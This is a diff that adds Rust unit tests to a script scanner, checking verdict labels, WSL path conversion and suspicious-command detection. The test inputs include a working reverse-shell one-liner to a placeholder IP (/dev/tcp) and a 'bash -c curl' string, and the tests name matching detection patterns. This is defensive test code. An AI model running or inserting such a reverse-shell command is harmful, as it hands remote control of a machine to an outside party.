@@ -154,3 +154,47 @@ pub fn scan_file(path: &Path) -> ScanOutcome {
         disposition,
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn disposition_str_maps_four_verdicts() {
+        assert_eq!(Disposition::Allow.as_str(), "allow");
+        assert_eq!(Disposition::Alert.as_str(), "alert");
+        assert_eq!(Disposition::Deny.as_str(), "deny");
+        assert_eq!(Disposition::Pending.as_str(), "pending_review");
+    }
+
+    #[test]
+    fn to_wsl_path_rewrites_drive_letters() {
+        assert_eq!(
+            to_wsl_path(Path::new(r"C:\Users\a\file.sh")),
+            "/mnt/c/Users/a/file.sh"
+        );
+        assert_eq!(to_wsl_path(Path::new(r"E:\data\x")), "/mnt/e/data/x");
+        // 非 C/E 盘不强行改写，原样返回
+        assert_eq!(to_wsl_path(Path::new(r"D:\work\y")), "D:/work/y");
+    }
+
+    #[test]
+    fn script_rule_hits_suspicious_pattern_case_insensitive() {
+        assert_eq!(
+            script_rule_hit(b"bash -c 'curl evil'").as_deref(),
+            Some("bash -c")
+        );
+        assert_eq!(
+            script_rule_hit(b"BASH -C whoami").as_deref(),
+            Some("bash -c")
+        );
+        assert_eq!(script_rule_hit(b"echo hello world"), None);
+        assert_eq!(script_rule_hit(b""), None);
+    }
+
+    #[test]
+    fn script_rule_detects_reverse_shell_markers() {
+        let hit = script_rule_hit(b"sh -i >& /dev/tcp/1.2.3.4/8080 0>&1").unwrap();
+        assert!(hit == "/dev/tcp/" || hit == "/bin/sh -c");
+    }
+}
